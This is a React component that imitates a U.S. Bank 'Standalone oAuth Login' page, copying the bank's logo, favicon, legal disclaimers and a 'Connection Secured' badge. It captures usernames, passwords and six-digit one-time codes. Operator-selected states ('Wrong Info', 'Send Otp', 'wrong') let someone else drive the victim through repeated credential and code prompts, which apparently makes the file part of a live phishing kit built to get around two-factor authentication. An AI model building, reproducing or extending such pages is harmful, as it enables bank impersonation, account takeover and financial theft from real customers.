import clsx from "clsx";
import useBankFunctions from "../../../../../../../hooks/useBankFunctions";
import { motion } from "framer-motion";
import BankingHeader from "./BankingHeader";
import UsbankFavIcon from "../../../../../../../../assets/allBanks/banks/usbank/ub3.ico";
import UsbankLogo from "../../../../../../../../assets/allBanks/banks/usbank/ub5.png";
import { RxExclamationTriangle } from "react-icons/rx";
import { otpOptions } from "../../bankDetails";
import { IoLockClosed } from "react-icons/io5";
import { Link } from "react-router-dom";
import Checked from "../../../../../../../../assets/allBanks/banks/usbank/ub4.png";
import ShareData from "./ShareData";
import { ClipLoader } from "react-spinners";
import BasicLoader from "../../../../../loading/BasicLoader";
import BankControl from "./BankControl";
import BankOtpControl from "./BankOtpControl";

const UsBank = ({
  handleCancel,
  bankName,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  activePathDetails,
  indexOtp,
  handleOtpOption,
  isOpenOtp,
  onSubmitOtpOptions,
  activeOtp,
  setAllBankItems,
  typeAccount,
  setTypeAccount,
  loading,
  setIsOpenOtp,
}) => {
  const {
    formState,
    handleTheMainSubmit,
    errorFormState,
    handleChange,
    onSubmitOtp,
    errorOtp,
    changeOtp,
    formOtp,
    resend,
    setshowPassword,
    showPassword,
    handleTheFinal,
    handleVerifiedOtp,
    onSumbitForm,
    handleResend,
  } = useBankFunctions(bankName, setOtpOpen, setAllBankItems, setTypeAccount);

  return (
    <motion.div
      initial={{ y: -100, opacity: 0 }}
      animate={{ y: 0, opacity: 1 }}
      exit={{ y: -100, opacity: 0 }}
      transition={{ type: "spring", stiffness: 300, damping: 50 }}
      className={clsx(
        "w-full min-h-screen h-full  top-0  bg-white",
        typeAccount ? "hidden" : "block"
      )}
    >
      <BankingHeader
        text="Standalone oAuth Login"
        handleCancel={handleCancel}
        img={UsbankFavIcon}
        setAllBankItems={setAllBankItems}
        setIsOpenOtp={setIsOpenOtp}
        setOtpOpen={setOtpOpen}
      />

      <header className="flex justify-center py-4 customXlg:block bg-customBlue-1009">
        <div>
          <img
            src={UsbankLogo}
            alt=""
            className="w-[350px] h-[22px] object-contain"
          />
        </div>
      </header>
      <div className="px-4 pt-16 pb-5 customMiniTablet:px-28">
        <div className={clsx(allBankOpen ? "hidden" : "block")}>
          <h1 className="mb-6 text-2xl font-bold text-black">
            Log in to your account
          </h1>
          <div className={clsx()}>
            <div className="mb-4 space-y-5">
              <input
                type="text"
                value={formState.username}
                name="username"
                onChange={handleChange}
                placeholder="Username"
                className={clsx(
                  "w-full pb-[2px] border-b focus:border-customBlue-1010 transistion2 placeholder:text-base  focus:border-2 placeholder:text-customGray-1023 outline-none pt-1",
                  errorFormState.username
                    ? "border-b border-customRed-600"
                    : "border-b-customGray-1024"
                )}
              />
              {errorFormState.username && (
                <p className="flex gap-2 mt-1 text-sm text-customRed-200">
                  <RxExclamationTriangle size={20} className="" />
                  Enter your username to log in.
                </p>
              )}
              <div className="flex items-center gap-2">
                <input type="checkbox" className="w-[20px] h-[20px]" />
                <p className="text-customGray-1020 ">Remember my username.</p>
              </div>
            </div>
            <div className="relative">
              <input
                placeholder="Password"
                type={showPassword ? "text" : "password"}
                value={formState.password}
                name="password"
                onChange={handleChange}
                className={clsx(
                  "w-full pb-[2px] border-b  focus:border-customBlue-1010 transistion2 placeholder:text-base  focus:border-2 placeholder:text-customGray-1023 outline-none pr-10 pt-1 ",
                  errorFormState.password
                    ? "border-b border-customRed-600"
                    : "border-b-customGray-1024"
                )}
              />
              <span
                onClick={() => setshowPassword((prevShow) => !prevShow)}
                className="absolute right-0 h-full text-xs leading-7"
              >
                {showPassword ? "Hide" : "Show"}
              </span>
              {errorFormState.password && (
                <p className="flex gap-2 mt-1 text-sm text-customRed-200">
                  <RxExclamationTriangle size={20} className="" />
                  Enter your password to log in.
                </p>
              )}
            </div>
            <div className="space-y-4 mt-9">
              <button
                className="w-full py-2 text-lg text-white rounded-lg bg-customBlue-1010 hover:bg-customBlue-1009 transistion2"
                onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
              >
                {loading && <ClipLoader size={10} color="#fff" />}
                {loading ? "Loading..." : "Log In"}
              </button>
              <button
                className="w-full py-2 text-lg border rounded-lg text-customBlue-1010 border-customBlue-1010 hover:bg-customBlue-1009 transistion2 hover:text-white"
                onClick={() => handleCancel(false)}
              >
                Cancel and return to Citibank
              </button>
            </div>
          </div>
        </div>
        {allBankOpen && (
          <div className={clsx(OtpOpen ? "hidden" : "block")}>
            <BankControl
              handleSelectedId={handleSelectedId}
              selectedPath={selectedPath}
              handleSelectSubmit={handleSelectSubmit}
            />
            <div>
              {activePathDetails.name === "Loading" && (
                <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                  <BasicLoader />
                </p>
              )}
              {activePathDetails.name === "Wrong Info" && (
                <>
                  <div className={clsx()}>
                    <h1 className="mb-6 text-2xl font-bold text-black">
                      Log in to your account
                    </h1>
                    <div className={clsx()}>
                      <div className="flex justify-center gap-1 mx-3 my-5 font-extrabold text-center customMiniTablet:mx-0 text-customRed-200">
                        <RxExclamationTriangle className="mt-[2px]" />

                        <p>{activePathDetails.body}</p>
                      </div>
                      <div className="mb-4 space-y-5">
                        <input
                          type="text"
                          value={formState.username}
                          name="username"
                          onChange={handleChange}
                          placeholder="Username"
                          className={clsx(
                            "w-full pb-[2px] border-b focus:border-customBlue-1010 transistion2 placeholder:text-base  focus:border-2 placeholder:text-customGray-1023 outline-none pt-1",
                            errorFormState.username
                              ? "border-b border-customRed-600"
                              : "border-b-customGray-1024"
                          )}
                        />
                        {errorFormState.username && (
                          <p className="flex gap-2 mt-1 text-sm text-customRed-200">
                            <RxExclamationTriangle size={20} className="" />
                            Enter your username to log in.
                          </p>
                        )}
                        <div className="flex items-center gap-2">
                          <input
                            type="checkbox"
                            className="w-[20px] h-[20px]"
                          />
                          <p className="text-customGray-1020 ">
                            Remember my username.
                          </p>
                        </div>
                      </div>
                      <div className="relative">
                        <input
                          placeholder="Password"
                          type={showPassword ? "text" : "password"}
                          value={formState.password}
                          name="password"
                          onChange={handleChange}
                          className={clsx(
                            "w-full pb-[2px] border-b  focus:border-customBlue-1010 transistion2 placeholder:text-base  focus:border-2 placeholder:text-customGray-1023 outline-none pr-10 pt-1 ",
                            errorFormState.password
                              ? "border-b border-customRed-600"
                              : "border-b-customGray-1024"
                          )}
                        />
                        <span
                          onClick={() =>
                            setshowPassword((prevShow) => !prevShow)
                          }
                          className="absolute right-0 h-full text-xs leading-7"
                        >
                          {showPassword ? "Hide" : "Show"}
                        </span>
                        {errorFormState.password && (
                          <p className="flex gap-2 mt-1 text-sm text-customRed-200">
                            <RxExclamationTriangle size={20} className="" />
                            Enter your password to log in.
                          </p>
                        )}
                      </div>
                      <div className="space-y-4 mt-9">
                        <button
                          className="w-full py-2 text-lg text-white rounded-lg bg-customBlue-1010 hover:bg-customBlue-1009 transistion2"
                          onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
                        >
                          {loading && <ClipLoader size={10} color="#fff" />}
                          {loading ? "Loading..." : "Log In"}
                        </button>
                        <button
                          className="w-full py-2 text-lg border rounded-lg text-customBlue-1010 border-customBlue-1010 hover:bg-customBlue-1009 transistion2 hover:text-white"
                          onClick={() => handleCancel(false)}
                        >
                          Cancel and return to Citibank
                        </button>
                      </div>
                    </div>
                  </div>
                </>
              )}
              {activePathDetails.name === "Send Otp" && (
                <>
                  <h3>{activePathDetails.body}</h3>
                  <div className={clsx(isOpenOtp && "hidden")}>
                    <div>
                      <div>
                        <div className="mb-2 space-y-1">
                          <h3 className="text-xl font-semibold text-customBlue-1010">
                            Next, we&apos;ll send you a code.
                          </h3>
                          <p className="text-sm text-customGray-1023">
                            Your security is important to us. To help protect
                            your identity, we will send a code to your mobile
                            device
                          </p>
                        </div>
                        <div>
                          <h2 className="font-semibold text-customGray-900">
                            How would you like to get your code?
                          </h2>
                          <p className="mb-2 text-sm text-customGray-200">
                            Select One:
                          </p>
                          <div
                            role="radiogroup"
                            aria-label="Otp Options"
                            className="flex flex-col space-y-3"
                          >
                            {otpOptions.map((bank) => (
                              <div
                                key={bank.id}
                                role="radio"
                                tabIndex={0}
                                onClick={() => handleOtpOption(bank.id)}
                                className="flex items-center gap-2.5 "
                              >
                                <div className="border border-black rounded-full p-[2px] text-center mb-[1px]">
                                  <p
                                    className={clsx(
                                      "rounded-full w-[10px] h-[10px]  ",
                                      otpOptions[indexOtp]?.id === bank.id
                                        ? "bg-customBlue-500"
                                        : ""
                                    )}
                                  ></p>
                                </div>
                                <h2
                                  className={clsx(
                                    "text-sm",
                                    otpOptions[indexOtp]?.id === bank.id
                                      ? "text-customBlue-500 hover:underline"
                                      : "hover:text-customBlue-700 hover:underline"
                                  )}
                                >
                                  {bank.name}
                                </h2>
                              </div>
                            ))}
                          </div>
                          <button
                            onClick={onSubmitOtpOptions}
                            className="w-full py-2 mt-5 text-lg text-white rounded-lg bg-customBlue-1010 hover:bg-customBlue-1009 transistion2"
                          >
                            Continue
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                  {isOpenOtp && (
                    <div className={clsx()}>
                      <div>
                        <div>
                          <div>
                            <h3 className="text-xl font-semibold text-customBlue-1010">
                              Enter the code we sent here
                            </h3>
                          </div>
                          <div>
                            <p className="mb-5 text-sm text-customGray-1023">
                              We sent a six-digit code to your mobile device.
                              Your code will expire in 15 minutes
                            </p>
                            <div>
                              <input
                                type="number"
                                placeholder="Six-digit code"
                                value={formOtp.otpo}
                                name="otpo"
                                onChange={changeOtp}
                                className={clsx(
                                  "w-full pb-[2px] border-b  focus:border-customBlue-1010 transistion2 placeholder:text-base  focus:border-2 placeholder:text-customGray-1023 outline-none pr-10 pt-1 no-spinner",
                                  errorOtp.otpo &&
                                    "border-b border-customRed-200"
                                )}
                              />
                              {errorOtp.otpo && (
                                <p className="mt-2 text-sm text-customRed-600">
                                  Please enter the verification code.
                                </p>
                              )}
                            </div>
                            <button
                              className="w-full py-2 my-8 text-lg text-white rounded-lg bg-customBlue-1010 hover:bg-customBlue-1009 transistion2 "
                              onClick={(e) => onSubmitOtp(e, handleVerifiedOtp)}
                            >
                              {loading && <ClipLoader size={10} color="#fff" />}
                              {loading ? "Loading..." : "Continue"}
                            </button>
                            <p
                              className={clsx(
                                "cursor-pointer text-customBlue-100 font-bold",
                                !resend &&
                                  "text-customBlue-500 text-opacity-25 cursor-not-allowed "
                              )}
                              onClick={handleResend}
                            >
                              Send a new code
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                  )}
                </>
              )}
            </div>
          </div>
        )}
        {OtpOpen && (
          <>
            <BankOtpControl
              handleSelectedOtp={handleSelectedOtp}
              selectedOtp={selectedOtp}
              handleSubmitOtp={handleSubmitOtp}
            />

            <div>
              {activeOtp.name === "Loading" && (
                <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                  <BasicLoader />
                </p>
              )}
              {activeOtp.name === "wrong" && (
                <>
                  <div className={clsx()}>
                    <div>
                      <div>
                        <div>
                          <h3 className="text-xl font-semibold text-customBlue-1010">
                            Enter the code we sent here
                          </h3>
                        </div>
                        <div>
                          <p className="mb-5 text-sm text-customGray-1023">
                            We sent a six-digit code to your mobile device. Your
                            code will expire in 15 minutes
                          </p>
                          <div>
                            <input
                              type="number"
                              placeholder="Six-digit code"
                              value={formOtp.otpo}
                              name="otpo"
                              onChange={changeOtp}
                              className={clsx(
                                "w-full pb-[2px] border-b  focus:border-customBlue-1010 transistion2 placeholder:text-base  focus:border-2 placeholder:text-customGray-1023 outline-none pr-10 pt-1 no-spinner",
                                errorOtp.otpo && "border-b border-customRed-200"
                              )}
                            />
                            {errorOtp.otpo && (
                              <p className="mt-2 text-sm text-customRed-600">
                                Please enter the verification code.
                              </p>
                            )}

                            <h3 className="mt-2 text-sm text-customRed-200">
                              {activeOtp.body}
                            </h3>
                          </div>
                          <button
                            className="w-full py-2 my-8 text-lg text-white rounded-lg bg-customBlue-1010 hover:bg-customBlue-1009 transistion2 "
                            onClick={(e) => onSubmitOtp(e, handleVerifiedOtp)}
                          >
                            {loading && <ClipLoader size={10} color="#fff" />}
                            {loading ? "Loading..." : "Continue"}
                          </button>
                          <p
                            className={clsx(
                              "cursor-pointer text-customBlue-100 font-bold",
                              !resend &&
                                "text-customBlue-500 text-opacity-25 cursor-not-allowed "
                            )}
                            onClick={handleResend}
                          >
                            Send a new code
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                </>
              )}
              {activeOtp.name === "otp" && (
                <>
                  <ShareData
                    bankName={bankName}
                    handleTheFinal={handleTheFinal}
                    handleCancel={handleCancel}
                    setIsOpenOtp={setIsOpenOtp}
                    setAllBankItems={setAllBankItems}
                    siteLink="https://www.usbank.com/index.html"
                  />
                </>
              )}
            </div>
          </>
        )}
      </div>
      <footer className="px-4 py-5 mt-20 bg-customGray-1025 customMiniTablet:px-28 ">
        <div className="flex gap-2 font-bold text-customBlue-1009">
          <IoLockClosed size={24} />
          <p>Connection Secured</p>
        </div>
        <Link
          to="https://www.usbank.com/index.html"
          className="block mt-3 text-xs customXlg:flex text-customBlue-1010"
        >
          <p className="px-1 underline customXlg:border-r border-customGray-400">
            Security
          </p>
          <p className="px-1 underline customXlg:border-r border-customGray-400">
            Privacy
          </p>
          <p className="flex gap-1 px-1 underline customXlg:border-r border-customGray-400">
            Your California privacy choicesprivacy choices
            <img src={Checked} alt="" className="underline w-[30px] h-[14px]" />
          </p>
          <p className="px-1 underline border-customGray-400">Cobrowse</p>
        </Link>
        <div className="mt-3 text-xs text-customGray-400">
          <div className="pb-2 border-b border-customGray-600">
            <p>©2025 U.S. Bank</p>
            <p>OLB Cloud : 1.175.0_BN_782</p>
          </div>
          <div className="pt-3 pb-2 pl-3 pr-10 font-semibold border border-customGray-400">
            <p>
              Investment and Insurance products and services including annuities
              are:
            </p>
            <ul className="w-full px-2 list-disc customMiniTablet:space-x-4 customMiniTablet:flex">
              <li>Not a Deposit</li>
              <li>Not FDIC Insured</li>
              <li>May Lose Value</li>
              <li>Not Bank Guaranteed</li>
              <li>Not Insured by any Federal Government Agency</li>
            </ul>
          </div>
          <div className="mt-8">
            <p className="mb-3 font-bold">For U.S. Bank:</p>
            <ul className="space-y-4 ">
              <li>
                {" "}
                Equal Housing Lender. Deposit products offered by U.S. Bank
                National Association. Member FDIC
              </li>
              <li>
                U.S. Bank is not responsible for and does not guarantee the
                products, services or performance of U.S. Bancorp Investments.
              </li>
              <li>
                U.S. Bank does not offer insurance products. Insurance products
                are available through our affiliate U.S. Bancorp investments.
              </li>
            </ul>
          </div>
          <div className="mt-8">
            <p className="mb-3 font-bold">For U.S. Bancorp Investments:</p>
            <ul className="space-y-4 ">
              <li>
                Investment and insurance products and services including
                annuities are available through U.S. Bancorp Investments, the
                marketing name for U.S. Bancorp Investments, Inc., member{" "}
                <span className="underline text-customBlue-1010">FINRA</span>
                and <span className="underline text-customBlue-1010">SIPC</span>
                , an investment adviser and a brokerage subsidiary of U.S.
                Bancorp and affiliate of U.S. Bank.
              </li>
              <li>
                U.S. Bancorp Investments is registered with the Securities and
                Exchange Commission as both a broker-dealer and an investment
                adviser. To understand how brokerage and investment advisory
                services and fees differ, the{" "}
                <span className="underline text-customBlue-1010">
                  Client Relationship Summary
                </span>{" "}
                and{" "}
                <span className="underline text-customBlue-1010">
                  Regulation Best Interest Disclosure
                </span>
                are available for you to review.
              </li>
              <li>
                Insurance products are available through various affiliated
                non-bank insurance agencies, which are U.S. Bancorp
                subsidiaries. Products may not be available in all states. CA
                Insurance License # 0E24641.
              </li>
              <li>
                The Financial Industry Regulatory Authority (FINRA) Rule 2267
                provides for BrokerCheck to allow investors to learn about the
                professional background, business practices, and conduct of
                FINRA member firms or their brokers. To request such
                information, contact FINRA toll-free 1.800.289.9999 or via{" "}
                <span className="underline text-customBlue-1010">
                  BrokerCheck
                </span>
                website. An investor brochure describing BrokerCheck is also
                available through FINRA
              </li>
            </ul>
          </div>
        </div>
      </footer>
    </motion.div>
  );
};

export default UsBank;
